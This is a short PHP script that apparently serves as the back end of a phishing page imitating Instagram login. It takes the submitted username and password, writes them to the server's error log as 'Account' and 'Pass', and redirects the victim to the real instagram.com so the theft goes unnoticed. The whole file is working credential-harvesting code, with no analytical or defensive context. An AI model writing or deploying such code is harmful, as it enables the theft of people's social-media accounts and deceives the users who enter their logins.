<?php
file_put_contents("php://stderr", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n");
header('Location: https://instagram.com');
exit();
